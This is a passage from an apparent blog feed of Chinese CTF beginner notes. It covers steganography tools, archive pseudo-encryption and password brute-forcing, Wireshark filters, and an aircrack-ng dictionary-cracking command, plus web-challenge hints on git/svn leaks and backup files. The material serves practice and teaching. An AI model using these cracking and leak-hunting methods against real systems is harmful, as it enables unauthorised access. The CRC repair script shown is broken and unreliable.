class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat a b c ... &gt; dist</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">完整性检查</span></span><br><span class="line">md5sum filename</span><br></pre></td></tr></table></figure></li><li><p>Windows下</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> /B a+b+c dist</span><br><span class="line"># 如果前缀一样</span><br><span class="line"><span class="built_in">copy</span> /B prefix* dist</span><br><span class="line"># 完整校验</span><br><span class="line">certutil -hashfile filename md5</span><br></pre></td></tr></table></figure></li></ol><h2><span id="图片隐写">图片隐写</span></h2><ol><li><p>细微颜色区别</p></li><li><p>GIF图多帧隐藏</p><ol><li>颜色通道隐藏</li><li>不同帧图信息隐藏</li><li>不同帧对比隐写</li></ol></li><li><p>Exif信息隐藏</p><p>通过属性可以看到信息</p></li><li><p>图片修复</p><ol><li>图片头修复</li><li>图片尾修复</li><li>CRC校验修复</li><li>长、宽、高修复</li></ol></li><li><p>最低有效位LSB隐写</p></li><li><p>图片加密</p><ol><li>Stegdetect</li><li>outguess</li><li>Jphide</li><li>F5</li></ol></li></ol><ul><li><p><strong>Firework</strong>：</p><blockquote><p>使用010 Editor打开文件时会看到文件头包含firework标识，通过firework可以找到隐藏图片。</p></blockquote></li><li><p><strong>Stegsolve</strong>:</p><blockquote><p>两张图片之间做运算<em>XOR&#x2F;SUB&#x2F;ADD</em></p><p>可以组合猜测LSB，但是每次都需要手动点击</p></blockquote></li><li><p><strong>Zsteg</strong>:</p><blockquote><p>直接排列组合所有LSB结果</p></blockquote></li><li><p><strong>wbstego4</strong>:</p><blockquote><p>可以解密.bmp&#x2F;pdf文件，需要先转bmp</p></blockquote></li><li><p><strong>python脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> PIL.Image</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">foo</span>():</span><br><span class="line">  im = PIL.Image.<span class="built_in">open</span>(<span class="string">&#x27;01.bmp&#x27;</span>)</span><br><span class="line">  im2 = im.copy()</span><br><span class="line">  pix = im2.load()</span><br><span class="line">  wid,hei = im2.size</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">0</span>,wid):</span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">0</span>,hei):</span><br><span class="line">      <span class="keyword">if</span> pix[x,y]&amp;<span class="number">0x1</span> == <span class="number">0</span>:</span><br><span class="line">        pix[x,y]=<span class="number">0</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        pix[x,y]=<span class="number">255</span></span><br><span class="line"> im2.show()</span><br><span class="line"> <span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li><li><p><strong>TweakPNG</strong>：</p><ul><li>​CRC错误</li></ul><blockquote><p>它可以修改和查看一些PNG图像文件的元信息存储，我们需要通过该软件修改，搜索软件提示错误值的crc值替换成正确的即可。</p></blockquote><ul><li>图片宽高错误</li></ul><blockquote><p>需要通过CRC计算出正确的宽高</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">crc_current = <span class="string">&#x27;0x08ec7edb&#x27;</span> <span class="comment"># 目前的就行，不是提示的正确的</span></span><br><span class="line">crcbp = <span class="built_in">open</span>(<span class="string">&#x27;xxx.png&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = crcbp[<span class="number">12</span>:<span class="number">16</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>)+crcbp[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc == crc_current:</span><br><span class="line">      <span class="built_in">print</span>(i,j)</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">hex</span>(i),<span class="built_in">hex</span>(j))</span><br></pre></td></tr></table></figure></li></ul><h3><span id="图片加密">图片加密</span></h3><ul><li><p>Bftools</p><blockquote><p>在win下用于对加密过的图片进行解密操作</p></blockquote></li><li><p>SilentEye</p><blockquote><p>可以将文字文件隐藏到图片，或者对图片进行解密的工具</p></blockquote></li><li><p>Stegdetect</p><blockquote><p>主要用于检测图片使用哪些隐写工具隐藏信息</p></blockquote></li><li><p>Jphide</p><blockquote><p>基于最低有效位LSB的图像隐写算法 </p></blockquote></li><li><p>Outguess</p><blockquote><p>图像隐写算法 </p></blockquote></li><li><p>F5</p><blockquote><p>图像隐写算法 </p></blockquote></li><li><p>CQR</p><blockquote><p>二维码处理</p></blockquote></li></ul><p><strong>二维码处理：</strong></p><ol><li>补全，可能二维码的方块被挡住了，我们需要讲起补全即可</li><li>取反：使用画图工具的反色 功能<ul><li>如果是彩色图片可以用<strong>Stegsolve</strong>查看颜色通道进行扫码，如果还没办法扫出来可以先反色再扫。</li></ul></li></ol><h2><span id="压缩文件处理">压缩文件处理</span></h2><h3><span id="判断什么加密方式">判断什么加密方式</span></h3><p><strong>伪加密：</strong></p><blockquote><p>压缩源文件数据区的<strong>全局方式位标记</strong>应当为 00 00 （50 4B 03 04 14 00 后）<br>且压缩源文件目录区的<strong>全局方式位标记</strong>应当为 09 00  （50 4B 01 02 14 00 后）</p></blockquote><p> <strong>真加密：</strong></p><blockquote><p>压缩源文件数据区的<strong>全局方式位标记</strong>应当为09 00 （50 4B 03 04 14 00 后） </p><p>且压缩源文件目录区的<strong>全局方式位标记</strong>应当为09 00 （50 4B 01 02 14 00 后） </p></blockquote><ol><li><p>伪加密</p><p><strong>使用场景：</strong> 伪加密文件</p></li></ol><p><strong>操作方法：</strong>使用winhex打开压缩文件，找到文件头第九第十个字符，将其修改为0000</p><p>   1.使用winhex打开文件搜索16进制504B0102，可以看到每个加密文件的文件头字段。</p><p>   <font color="orange"><strong>RAR文件</strong></font>由于有头部校验，使用伪加密时打开文件会出现报错，使用winhex修改标志位后如报错消失目正常解压缩，说明是伪加密。使用winhex打开RAR文件，找到第24个字节，该字节尾数为4表示加密，0表示无加密，将尾数改为0即可破解伪加密</p><ol start="2"><li><p>暴力破解</p><p>通常我们可以使用ARCHPR.exe工具来破解rar文件，用Ziperello来破解zip</p><p><strong>使用场景：</strong>windows下加密过的zip文件</p><ol><li><p>攻击类型选择暴力破解，在范围位置根据提示选择暴力破解范围选项设置暴力破解包含的类型开始于和结束于选项具体范围，如果没有定义则全范围暴力破解。点击打开选择要破解的文件，点击开始进行破解。建议使用1~9位的数字密码，以及系统 自带的英文字典作为密码字典。</p></li><li><p>攻击类型选择掩码可以进行复杂的暴力破解比如知道密码前3位是abc，后3位为数字，则在攻击类型选择掩码，在掩码处输入acb???，暴力范围选项选择所有数字，打开要破解的点击，点击破解。此时?? ?的部分会被我们选择的暴力破解范围中的字符代替。</p></li><li><p>有时不一定能破解出文件口令，但是能够找到加密密钥等信息，可以直接将文件解密，点击确定保存解密后的文件</p></li></ol><p>使用该方法需要注意两个关键点:<br>1、有一个明文文件，压缩后CRC值与加密压缩包中的文件一致。<br>2、明文文件的压缩算法需要与加密压缩文件的压缩算法一致。</p></li><li><p>文件分析</p><p>有时候给的RAR文件头部各个字块会故意给错导致无法识别（隐藏文件）</p><table><thead><tr><th>字段</th><th>大小</th><th>作用</th></tr></thead><tbody><tr><td>HEAD CRC</td><td>2 字节</td><td>所有块或块部分的CRC</td></tr><tr><td>HEAD TYPE</td><td>1 字节</td><td>块类型</td></tr><tr><td>HEAD FLAGS</td><td>2 字节</td><td>块标记</td></tr><tr><td>HEAD SIZE</td><td>2 字节</td><td>块大小 #如果块标记的第一位被置1的话，还存在</td></tr><tr><td>ADD SIZE</td><td>4 字节</td><td>可选结构 - 增加块大小</td></tr></tbody></table><p>那么，文件块的<strong>第3个字节为块类型，也叫头类型</strong></p><p> 头类型是0x72表示是标记块</p><p>头类型是0x73表示是压缩文件头块</p><p>头类型是0x74表示是<strong>文件头</strong>块</p><p>头类型是0x75表示是注释头</p></li></ol><h2><span id="流量分析">流量分析</span></h2><blockquote><p>CTF 比赛中，流量包的取证分析是另一项重要的考察方向。<br>通常比赛中会提供一个包含流量数据的PCAP 文件，有时候也会需要选手们先进行修复或重构传输文件后，再进行分析。</p></blockquote><ul><li><p>总体把握</p><ul><li>协议分级</li><li>端点统计</li></ul></li><li><p>过滤筛选</p><ul><li>过滤语法</li><li>Host，Protocol，contains，特征值</li></ul></li><li><p>发现异常</p><ul><li>特殊字符串</li><li>协议某字段</li><li>flag 位于服务器中</li></ul></li><li><p>数据提取</p><ul><li>字符串取</li><li>文件提取</li></ul></li><li><p><strong>总的来说比赛中的流量分析可以概括为以下三个方向:</strong></p><ul><li>流量包修复</li><li>协议分析</li><li>数据提取</li></ul></li></ul><p>常用的过滤命令：</p><ol><li><p>过滤IP，如源IP或者目标</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq x.x.x.x or ip.dst eq x.x.x.x</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">ip.addr eq x.x.x.x</span><br></pre></td></tr></table></figure></li><li><p>过滤端口</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80</span><br><span class="line">tcp.dstport == 80 <span class="comment"># 只显示tcp目标地址80端口</span></span><br><span class="line">tcp.srcport == 80 <span class="comment"># 只显示tcp目标地址80端口</span></span><br><span class="line">tcp.port &gt;=1 and tcp.port &lt;=80</span><br></pre></td></tr></table></figure></li><li><p>过滤协议</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp/udp/arp/icmp/http/ftp/dns/ip...</span><br></pre></td></tr></table></figure></li><li><p>过滤MAC</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.dst == xx:xx:...</span><br></pre></td></tr></table></figure></li><li><p>包长度过滤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">udp.length == 26 <span class="comment"># 这个长度是指udp本身固定长度8加上udp下面那块数据包之和</span></span><br><span class="line">tcp.len &gt;=7 <span class="comment">#指的是ip数据包（tcp下面那块数据），不包括tcp本身</span></span><br><span class="line">ip.len == 94 <span class="comment">#除了以太网头固定长度14，其他都算ip.len，即从ip本身到最后</span></span><br><span class="line">frame.len == 119 <span class="comment">#整个数据包长度，从eth开始到最后</span></span><br></pre></td></tr></table></figure></li><li><p>http模式过滤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http.request.method ==<span class="string">&quot;GET&quot;</span></span><br><span class="line">http.request.method ==<span class="string">&quot;POST&quot;</span></span><br><span class="line">http.request.uri == <span class="string">&quot;/img/logo-edu.gif&quot;</span></span><br><span class="line">http contains <span class="string">&quot;GET&quot;</span></span><br><span class="line">http contains <span class="string">&quot;HTTP/1.&quot;</span></span><br><span class="line">http.request.method == <span class="string">&quot;GET&quot;</span> &amp;&amp; http contains <span class="string">&quot;User-Agent:&quot;</span></span><br><span class="line">http contains <span class="string">&quot;flag&quot;</span></span><br><span class="line">http contains <span class="string">&quot;key&quot;</span></span><br><span class="line">tcp contains <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>协议分析</p><blockquote><p>Statistics-&gt;Protocal Hierarchy</p><p>Apply as filter-&gt;selected</p></blockquote></li><li><p>流汇聚</p><blockquote><p>选中一条后，追踪流</p></blockquote><ul><li>HTML中直接包含重要信息</li><li>上传或者下载文件内容，通常包含文件名、hash值等关键信息，常用POST请求上传</li><li>一句话木马，POST请求，内容包含eval，使用base64加密</li></ul></li><li><p>数据提取</p><p>自动提取</p><blockquote><p>文件-&gt;导出对象-》http</p></blockquote><p>手动提取内容</p><blockquote><p>点击想要的数据包，选定media type的位置</p><p>右键-&gt;导出分组字节流</p><p>文件-&gt;出分组字节流</p><p>选择保存二进制</p></blockquote></li><li><p>无线wifi流量包</p><ol><li>用aircrack-ng检查cap包：<code>aircrack-ng xxx.cap</code></li><li>跑字典<code>aircarck-ng xxx.cap -w pass.txt</code></li></ol></li><li><p>USB流量</p><ol><li><p>键盘</p><blockquote><p>可以将该域的值在主面板上显示，键盘数据包的数据长度为8个字节，击键信息集中在第3个字节，每次key stroke都会产生一个keyboard event usbpacket .</p></blockquote><p>a. 第一种方法：导出分组解析结果-&gt;为csv</p></li></ol><p>​   b. 第二种方法：使用ws提供的命令行工具，apply as column 然后tshark</p><p>​  <code>tshark -r usb1.pap -T fields -e usb.capdata &gt; usbdata.txt</code></p><p>​      c. 用脚本去分析</p><ol start="2"><li><p>鼠标</p><blockquote><p>鼠标流量与键盘流量不同，鼠标移动时表现为连续性，与键盘的离散性不一样。但是实际鼠标产生的数据是离散的。所以同样可以把数据抓取出来，构成二维坐标画出轨迹。</p><p>鼠标数据包的数据长度为4个字节，第一个字节代表按键，当取0x00时，代表没有按键;为0x01时，代表按左键，为0x02时，代表当前按键为右键。</p><p>第二个字节代表左右偏移;当值为正时，代表右移多少像素。当值为负时，代表左移多少像素。<br>同理，第三个字节代表上下偏移。</p></blockquote><p>用脚本去画出鼠标的图</p></li></ol></li><li><p>HTTPS流量包文件分析</p><blockquote><p>Preferences-&gt;Protocols-&gt;SSL-&gt;Edit RSA keys list</p></blockquote></li></ol><h1><span id="crypto">Crypto</span></h1><p><a href="http://www.hiencode.com/">解码工具网站</a></p><ul><li><p>编码：</p><ul><li>ASCII</li><li>BASE64：<ul><li>特征：文本末尾出现1到2个**&#x3D;&#x3D;**</li></ul></li><li>URL：<ul><li>就是一个字符的ascii码的十六进制，需要在前面加%。</li><li>特征：%</li></ul></li><li>Unicode<ul><li>特征：\uxx</li></ul></li><li>js<ul><li>使用浏览器输入eval()</li></ul></li></ul></li><li><p>加密</p><ul><li>对称加密<ul><li>DES</li><li>AES</li></ul></li><li>非对称加密<ul><li>RSA</li><li>ECA</li></ul></li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub入门笔记</title>
    <link href="https://disda-coding.github.io/2023/03/29/ctf/"/>
    <id>https://disda-coding.github.io/2023/03/29/ctf/</id>
    <published>2023-03-29T02:26:56.000Z</published>
    <updated>2023-04-20T08:34:56.082Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>收集和记录一下CTF入门的write up</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%BD%91%E7%AB%99">网站</a></li><li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li><li><a href="#web">Web</a><ul><li><a href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD">前置技能</a><ul><li><a href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">请求方式</a></li><li><a href="#302%E8%B7%B3%E8%BD%AC">302跳转</a></li><li><a href="#cookie">Cookie</a></li><li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81">基础认证</a></li><li><a href="#%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81">响应包源代码</a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">信息泄露</a><ul><li><a href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86">目录遍历</a></li><li><a href="#phpinfo">phpinfo</a></li><li><a href="#hg%E6%B3%84%E9%9C%B2">hg泄露</a></li><li><a href="#svn%E6%B3%84%E9%9C%B2">SVN泄露</a></li><li><a href="#git%E6%B3%84%E9%9C%B2">Git泄露</a><ul><li><a href="#log">log</a></li><li><a href="#stash">Stash</a></li><li><a href="#index">index</a></li></ul></li><li><a href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">备份文件下载</a><ul><li><a href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81">网站源码</a></li><li><a href="#bak%E6%96%87%E4%BB%B6">bak文件</a></li><li><a href="#vim%E7%BC%93%E5%AD%98">vim缓存</a></li><li><a href="#ds_store">DS_Store</a></li></ul></li><li><a href="#%E5%AD%97%E7%AC%A6%E5%9E%8B">字符型</a></li><li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">报错注入</a></li><li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5">布尔注入</a></li><li><a href="#mysql%E7%BB%93%E6%9E%84">MySQL结构</a></li><li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">时间盲注</a></li><li><a href="#cookie%E6%B3%A8%E5%85%A5">cookie注入</a></li><li><a href="#ua%E6%B3%A8%E5%85%A5">UA注入</a></li><li><a href="#referer%E6%B3%A8%E5%85%A5">Referer注入</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC">过滤空格</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">文件上传</a><ul><li><a href="#%E6%97%A0%E9%AA%8C%E8%AF%81">无验证</a></li><li><a href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81">前端验证</a></li><li><a href="#htaccess">.htaccess</a></li><li><a href="#mime">MIME</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5">文件头检查</a></li><li><a href="#00%E6%88%AA%E6%96%AD">00截断</a></li><li><a href="#%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80">双写后缀</a></li></ul></li><li><a href="#rce">RCE</a><ul><li><a href="#eval%E6%89%A7%E8%A1%8C">eval执行</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">文件包含</a></li><li><a href="#phpinput">php:&#x2F;&#x2F;input</a></li><li><a href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81">读取源代码</a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB">远程包含</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5">命令注入</a></li><li><a href="#%E8%BF%87%E6%BB%A4cat">过滤cat</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-1">过滤空格</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E5%89%B2%E7%AC%A6">过滤目录分割符</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6">过滤运算符</a></li><li><a href="#%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0">综合练习</a></li></ul></li><li><a href="#ssrf">SSRF</a><ul><li><a href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE">内网访问</a></li><li><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">伪协议读取文件</a></li><li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a></li><li><a href="#post%E8%AF%B7%E6%B1%82">POST请求</a></li><li><a href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6">上传文件</a></li><li><a href="#redis%E5%8D%8F%E8%AE%AE">Redis协议</a></li><li><a href="#url-bypass">URL Bypass</a></li><li><a href="#%E6%95%B0%E5%AD%97ip-bypass">数字IP Bypass</a></li><li><a href="#302%E8%B7%B3%E8%BD%AC-1">302跳转</a></li><li><a href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-bypass">DNS重绑定 Bypass</a></li></ul></li></ul></li><li><a href="#reverse">Reverse</a></li><li><a href="#crypto">Crypto</a></li><li><a href="#misc">Misc</a><ul><li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">流量分析</a><ul><li><a href="#mysql%E6%B5%81%E9%87%8F">Mysql流量</a></li><li><a href="#redis%E6%B5%81%E9%87%8F">Redis流量</a></li><li><a href="#mongodb">MongoDB</a></li><li><a href="#icmp-data">ICMP Data</a></li><li><a href="#icmp-length">ICMP Length</a></li><li><a href="#icmp-lengthbin">ICMP LengthBin</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="网站">网站</span></h1><ul><li>刷题<ul><li><a href="https://www.ctfhub.com/#/skilltree">CTFHUB</a> 对新人极其友好，可以快速入门CTF</li><li><a href="https://buuoj.cn/login?next=/challenges?">https://buuoj.cn/login?next=%2Fchallenges%3F</a></li><li><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></li></ul></li><li>搜索引擎<ul><li><a href="https://fofa.info/">https://fofa.info/</a></li><li><a href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></li></ul></li></ul><h1><span id="工具">工具</span></h1><ul><li><p>BurpSuite</p><blockquote><p>​Burp Suite是一个功能强大的集成渗透测试工具，旨在帮助安全测试人员执行各种 Web 应用程序安全测试。它提供了多个模块，包括代理、扫描器、爬虫、反射器、拦截器、重放器等功能，可协助测试人员发现应用程序中的漏洞，如SQL注入、跨站点脚本（XSS）、身份验证和会话问题、CSRF、文件包含漏洞等。</p></blockquote></li><li><p>WiresShark</p><blockquote><p>Wireshark是一款网络协议分析工具，可以帮助用户捕获和分析网络数据包。它能够实时抓取和展示网络上所有传输的数据，并提供多种过滤机制和统计图表，能够深入了解网络通信的细节，发现网络通信中可能存在的问题。</p></blockquote></li><li><p>fscan</p><blockquote><p>fscan是一款基于Python的网络渗透测试工具，它可以用于目标发现、端口扫描、漏洞检测等方面。fscan能够快速扫描大量IP地址和端口，并提供了多种扫描方式和过滤规则，例如TCP和UDP端口扫描、服务识别、OS指纹识别等。</p></blockquote></li><li><p>GitHack</p><blockquote><p>GitHack指的是一种基于Git版本控制系统的攻击技术。攻击者可以使用GitHack来获取敏感信息或执行未经授权的操作。攻击者通常会在Git上查找敏感信息，例如密码或私钥，并利用这些信息进一步入侵目标系统。</p></blockquote></li><li><p>dvcs-ripper</p><blockquote><p>可以支持svn、hg等文件下载</p></blockquote></li><li><p>PostMan</p><blockquote><p>Postman是一个<a href="https://baike.baidu.com/item/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/1917757?fromModule=lemma_inlink">接口测试</a>工具,在做接口测试的时候,Postman相当于一个客户端,它可以模拟用户发起的各类<a href="https://baike.baidu.com/item/HTTP%E8%AF%B7%E6%B1%82/10882159?fromModule=lemma_inlink">HTTP请求</a>,将请求<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81/22124759?fromModule=lemma_inlink">数据发送</a>至<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E7%AB%AF/6492316?fromModule=lemma_inlink">服务端</a>,获取对应的响应结果, 从而验证响应中的结果数据是否和预期值相匹配;并确保开发人员能够及时处理接口中的<a href="https://baike.baidu.com/item/bug/3353935?fromModule=lemma_inlink">bug</a>,进而保证产品上线之后的稳定性和安全性</p></blockquote></li></ul><h1><span id="web">Web</span></h1><h3><span id="前置技能">前置技能</span></h3><h4><span id="请求方式">请求方式</span></h4><ul><li>思路：使用PostMan，修改请求方式为CTFHUB</li></ul><h4><span id="302跳转">302跳转</span></h4><p>使用浏览器访问index.php时，发现F12中network有302</p><ul><li>思路：使用curl访问index.php即可，因为curl不支持302跳转</li></ul><h4><span id="cookie">Cookie</span></h4><p><a href="https://www.wolai.com/ctfhub/6zSDRPLbitJ5j4e7CE9dLp">参考</a>，使用<code>burpsuite</code>的<code>repeater</code>功能</p><h4><span id="基础认证">基础认证</span></h4><p><a href="https://www.wolai.com/ctfhub/3mSzAzbGydVT74nsq1gcVj">参考</a>，使用<code>burpsuite</code>的<code>Intruder</code>功能</p><h4><span id="响应包源代码">响应包源代码</span></h4><p>使用F12直接在前端源代码里面查看</p><h3><span id="信息泄露">信息泄露</span></h3><h4><span id="目录遍历">目录遍历</span></h4><p>由于配置错误导致网站的目录可被遍历。</p><ul><li>思路：我们遍历网站即可找到结果</li></ul><h4><span id="phpinfo">phpinfo</span></h4><p>phpinfo()是php中查看相关信息的函数，当在页面中执行<code>phpinfo()</code>函数时，php会将自身的所有信息全部打印出来。在<code>phpinfo</code>中会泄露很多服务端的一些信息</p><ul><li>思路：flag暴露在phpinfo中</li></ul><h4><span id="hg泄露">hg泄露</span></h4><ul><li>思路：使用dirsearch发现有.hg文件夹，使用dvcs-ripper下载目录，但是工具没有将所有文件下下来，使用<code>tree</code>命令来查看目录，分析发现txt文件中有<code>add flag</code>，使用<code>grep -a -r flag</code>查看flag存在的文件名，通过curl来查看文件。</li></ul><h4><span id="svn泄露">SVN泄露</span></h4><ul><li>思路：使用dirsearch发现有.svn文件夹，使用dvcs-ripper下载目录，从 wc.db 中找到 flag 的文件的文件名, 尝试访问结果发现被删除了。查看<code>.svn/pristine/</code>中的文件，找到flag</li></ul><h4><span id="git泄露">Git泄露</span></h4><ul><li>思路：使用dirsearch发现有.git文件夹，使用githack工具将网站里的.git文件夹下载到本地</li></ul><h5><span id="log">log</span></h5><p>网站下可能有.git文件</p><ul><li>思路：我们通过<code>git log</code>查看提交日志，然后用过<code>git diff</code>来对比版本区别找到flag</li></ul><h5><span id="stash">Stash</span></h5><p>git可能有的文件放到stash暂存</p><ul><li>思路：通过<code>git stash list</code>查看，执行 git stash pop 发现从 git 栈中弹出来一个文件，这个文件的内容就是 flag</li></ul><h5><span id="index">index</span></h5><p>使用<code>git ls-file --stage</code>查看index file文件，使用<code>git log</code>命令查看历史记录，通过<code>git diff</code>对比提交版本。</p><h4><span id="备份文件下载">备份文件下载</span></h4><h5><span id="网站源码">网站源码</span></h5><ul><li>思路：网站源码可能放在目录里面，打开即可获取flag</li></ul><h5><span id="bak文件">bak文件</span></h5><p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak</p><ul><li>思路：直接使用curl + url 即可访问</li></ul><h5><span id="vim缓存">vim缓存</span></h5><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容  </p><p>以index.php为例：第一次产生的交换文件名为<code>.index.php.swp</code>，再次意外退出后会产生名为 <code>.index.php.swo</code>的交换文件，第三次产生的交换文件则为 <code>.index.php.swn</code></p><ul><li>思路：使用curl访问，或者使用wget下载到本地再查看</li></ul><h5><span id="ds_store">DS_Store</span></h5><figure class="highlight plaintext"><figcaption><span>是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过```.DS_Store```可以知道这个目录里面所有文件的清单。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 思路：使用curl命令访问```.DS_Store``` 文件即可</span><br><span class="line"></span><br><span class="line">### 密码口令</span><br><span class="line"></span><br><span class="line">#### 弱口令</span><br><span class="line"></span><br><span class="line">- 思路：看到管理系统默认账号为admin，密码先尝试用弱口令密码本攻击，发现无效</span><br><span class="line"></span><br><span class="line">#### 